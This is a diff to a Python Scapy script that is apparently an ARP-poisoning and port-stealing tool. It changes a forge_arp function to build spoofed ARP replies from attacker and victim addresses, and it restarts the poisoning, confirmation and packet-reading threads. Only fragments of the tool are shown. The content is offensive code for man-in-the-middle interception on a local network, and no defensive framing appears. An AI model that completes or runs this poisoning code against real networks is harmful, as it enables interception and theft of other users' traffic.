@@ -19,9 +19,9 @@ PORT_STEAL_SEND_DELAY = 2000  # microseconds
 ATTACKER_MAC = get_if_hwaddr(conf.iface)
 ATTACKER_IP = get_if_addr(conf.iface)
 
-poison_thread: threading.Thread = 0
-poison_confirm_thread: threading.Thread = 0
-read_packets_thread: threading.Thread = 0
+poison_thread = 0
+poison_confirm_thread = 0
+read_packets_thread = 0
 
 
 
@@ -62,9 +62,9 @@ def forge_l2_ping(victim_src_ip, victim_dst_ip, victim_dst_mac):
     ping = IP(src=victim_src_ip, dst=victim_dst_ip)/ICMP()
     return ping
 
-def forge_arp(victim_src_ip, victim_dst_ip, victim_dst_mac):
+def forge_arp(victim_dst_ip, victim_src_ip, victim_src_mac, attacker_mac, mode):
     # arp = build_ether(macVictim) / IP(dst=ipVictim) / build_icmp_echo()
-    arp = build_ether(ATTACKER_MAC)/ICMP()
+    arp = build_ether(attacker_mac)/build_arp(victim_dst_ip, victim_src_ip, victim_src_mac, attacker_mac, mode)
     return arp
 
 def arp_poison():
@@ -107,9 +107,9 @@ def read_packets():
 
 def main():
     #use daemon=True to run in background and stop when application quits
-    poison_thread =  threading.Thread(target=arp_poison, daemon=True).start()
-    poison_confirm_thread = threading.Thread(target=poison_confirm, daemon=True).start()
-    read_packets_thread = threading.Thread(target=read_packets, daemon=True).start()
+    poison_thread =  threading.Thread(target=arp_poison).start()
+    poison_confirm_thread = threading.Thread(target=poison_confirm).start()
+    read_packets_thread = threading.Thread(target=read_packets).start()
 
     # wait for ctrl+c to exit application
     try: 
